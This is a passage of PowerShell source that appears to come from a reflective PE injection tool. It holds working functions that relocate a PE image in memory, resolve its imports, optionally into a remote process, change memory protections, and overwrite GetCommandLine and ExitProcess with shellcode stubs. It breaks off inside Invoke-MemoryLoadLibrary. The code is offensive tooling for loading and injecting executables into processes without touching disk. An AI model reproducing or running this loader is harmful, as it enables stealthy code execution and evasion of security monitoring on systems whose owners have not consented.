        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                
                
                
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    
                    Throw ""Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo""
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose ""Done importing DLL imports""
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw ""Error importing DLL, DLLName: $ImportDllPath""
                }
                
                
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    
                    
                    
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw ""New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath""
                        }
                        else
                        {
                            Throw ""New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath""
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    
                    
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString ""Update-MemoryProtectionFlags::VirtualProtect"" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw ""Unable to change memory protection""
            }
        }
    }
    
    
    
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""Kernel32.dll"")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw ""Kernel32 handle null""
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(""KernelBase.dll"")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw ""KernelBase handle null""
        }

        
        
        
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineA"")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineW"")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw ""GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)""
        }

        
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw ""Call to VirtualProtect failed""
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw ""Call to VirtualProtect failed""
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        
        
        
        
        
        
        $DllList = @(""msvcr70d.dll"", ""msvcr71d.dll"", ""msvcr80d.dll"", ""msvcr90d.dll"", ""msvcr100d.dll"", ""msvcr110d.dll"", ""msvcr70.dll"" `
            , ""msvcr71.dll"", ""msvcr80.dll"", ""msvcr90.dll"", ""msvcr100.dll"", ""msvcr110.dll"")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_wcmdln"")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_acmdln"")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    ""Error, couldn't find _wcmdln or _acmdln""
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw ""Call to VirtualProtect failed""
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw ""Call to VirtualProtect failed""
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        
        
        
        
        

        $ReturnArray = @()
        $ExitFunctions = @() 
        
        
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(""mscoree.dll"")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw ""mscoree handle null""
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, ""CorExitProcess"")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw ""CorExitProcess address not found""
        }
        $ExitFunctions += $CorExitProcessAddr
        
        
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitProcess"")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw ""ExitProcess address not found""
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            
            
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitThread"")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw ""ExitThread address not found""
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw ""Call to VirtualProtect failed""
            }
            
            
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            
            
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        

        Write-Output $ReturnArray
    }
    
    
    
    
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw ""Call to VirtualProtect failed""
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    
    
    
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                
                
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        
        Write-Verbose ""Getting basic PE information from the file""
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning ""PE is not compatible with DEP, might cause issues"" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""IsWow64Process"")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw ""Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit""
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw ""Call to IsWow64Process failed""
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
